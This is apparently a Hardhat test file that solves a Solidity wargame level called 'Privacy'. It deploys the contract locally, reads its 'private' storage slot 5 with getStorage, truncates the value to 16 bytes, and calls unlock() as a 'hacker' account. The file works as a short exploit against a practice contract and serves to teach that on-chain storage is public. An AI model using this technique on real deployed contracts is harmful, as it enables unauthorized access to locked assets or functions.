import {loadFixture} from "@nomicfoundation/hardhat-toolbox/network-helpers"
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Level 12 - Privacy contract hack", () => {
    async function setUp() {
        const [owner, hacker] = await ethers.getSigners();

        const words = ["Augusto", "Shelter", "Coding"];
        const data: [string, string, string] = [ethers.encodeBytes32String(words[0]), ethers.encodeBytes32String(words[1]), ethers.encodeBytes32String(words[2])];

        const PrivacyContract = await ethers.getContractFactory("Privacy");
        const privacy = await PrivacyContract.deploy(data);

        return {owner, hacker, data, privacy};
    };
    
    describe("When hacking", () => {
        it("Retrieving the second elem from the data array should suffice to unlock the contract", async() => {
            const {owner, hacker, data, privacy} = await loadFixture(setUp);

            const keyData = await ethers.provider.getStorage(await privacy.getAddress(), 5);
            const keyData16Bytes = keyData.slice(0,34); // We keep the 0x to note hexadecimal value.
            console.log(keyData, keyData16Bytes);

            expect(await privacy.locked()).to.equal(true);
            await privacy.connect(hacker).unlock(keyData16Bytes);
            expect(await privacy.locked()).to.equal(false);
        });
    });
});